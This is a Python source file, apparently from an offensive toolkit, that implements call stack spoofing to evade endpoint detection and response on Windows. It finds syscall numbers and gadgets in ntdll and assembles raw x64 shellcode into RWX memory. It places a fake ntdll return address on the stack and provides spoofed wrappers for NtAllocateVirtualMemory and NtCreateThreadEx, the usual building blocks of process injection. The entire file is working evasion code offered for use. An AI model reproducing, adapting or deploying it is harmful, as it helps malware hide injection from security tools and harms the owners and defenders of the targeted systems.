"""Call stack spoofing — fake ntdll return address on call stack for EDR evasion."""
import os
import ctypes
import struct

MAGIC = struct.pack('B', 0xC3)
MEM = 0x3000  # MEM_COMMIT | MEM_RESERVE
RWX, NTSTATUS = 0x40, ctypes.c_long
def _gpa(name):
    return ctypes.windll.kernel32.GetProcAddress(ctypes.windll.ntdll._handle, name.encode())
def _ssn(name):
    a = _gpa(name)
    return (ctypes.c_ubyte * 4).from_address(a + 4)[0] | ((ctypes.c_ubyte * 4).from_address(a + 4)[1] << 8) if a else 0
def find_gadget(pattern=b'\xC3', module='ntdll.dll'):
    """Find byte pattern in loaded module. Returns virtual address or 0."""
    if os.name != 'nt':
        return 0
    for c in ('KiUserApcDispatch', 'KiUserExceptionDispatch', 'NtClose'):
        a = _gpa(c)
        if a:
            break
    if not a:
        return 0
    pl = len(pattern)
    for off in range(0, 0x200):
        if all(ctypes.c_ubyte.from_address(a + off + i).value == pattern[i]
               for i in range(pl)):
            return a + off
    return 0
def _build_spoof(ssn, nstack, fret):
    a = _gpa('NtClose')
    sg = 0
    if a:
        for off in range(0, 32):
            if (ctypes.c_ubyte.from_address(a + off).value == 0x0F
                    and ctypes.c_ubyte.from_address(a + off + 1).value == 0x05):
                sg = a + off
                break
    if not sg:
        return None
    s = bytearray()
    s += b'\x48\xB8' + struct.pack('<Q', fret) + b'\x50'
    for i in range(nstack):
        src, dst = 0x30 + i * 8, 0x28 + i * 8
        s += b'\x48\x8B\x84\x24' + struct.pack('<I', src)
        s += b'\x48\x89\x84\x24' + struct.pack('<I', dst)
    s += b'\x4C\x8B\xD1'
    s += bytes([0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0, 0])
    s += b'\x49\xBB' + struct.pack('<Q', sg) + b'\x41\xFF\xE3'
    return bytes(s)
def spoof_call_stack(nt_func, *args):
    """Push fake ntdll ret-addr, jmp to ntdll syscall;ret. Returns NTSTATUS."""
    if os.name != 'nt':
        return None
    ssn, fr = _ssn(nt_func), find_gadget()
    if not ssn or not fr:
        return None
    stub = _build_spoof(ssn, max(0, len(args) - 4), fr)
    if not stub:
        return None
    sz = len(stub)
    addr = ctypes.windll.kernel32.VirtualAlloc(0, sz, MEM, RWX)
    if not addr:
        return None
    ctypes.memmove(addr, stub, sz)
    arg_types = [ctypes.c_uint64] * max(4, len(args))
    proto = ctypes.CFUNCTYPE(NTSTATUS, *arg_types)
    a = list(args) + [0] * (len(arg_types) - len(args))
    return proto(addr)(*a)
def spoofed_NtAllocateVirtualMemory(hProcess, pBaseAddress, ZeroBits, pRegionSize,
                                    AllocationType, Protect):
    """Call-stack-spoofed NtAllocateVirtualMemory (6 args)."""
    if os.name != 'nt':
        return None
    return spoof_call_stack('NtAllocateVirtualMemory',
                            hProcess, pBaseAddress, ZeroBits, pRegionSize,
                            AllocationType, Protect)
def spoofed_NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes,
                              ProcessHandle, StartRoutine, Argument,
                              CreateFlags, ZeroBits, StackSize, MaxStackSize,
                              AttributeList):
    """Call-stack-spoofed NtCreateThreadEx (11 args)."""
    if os.name != 'nt':
        return None
    return spoof_call_stack('NtCreateThreadEx',
                            ThreadHandle, DesiredAccess, ObjectAttributes,
                            ProcessHandle, StartRoutine, Argument,
                            CreateFlags, ZeroBits, StackSize, MaxStackSize,
                            AttributeList)
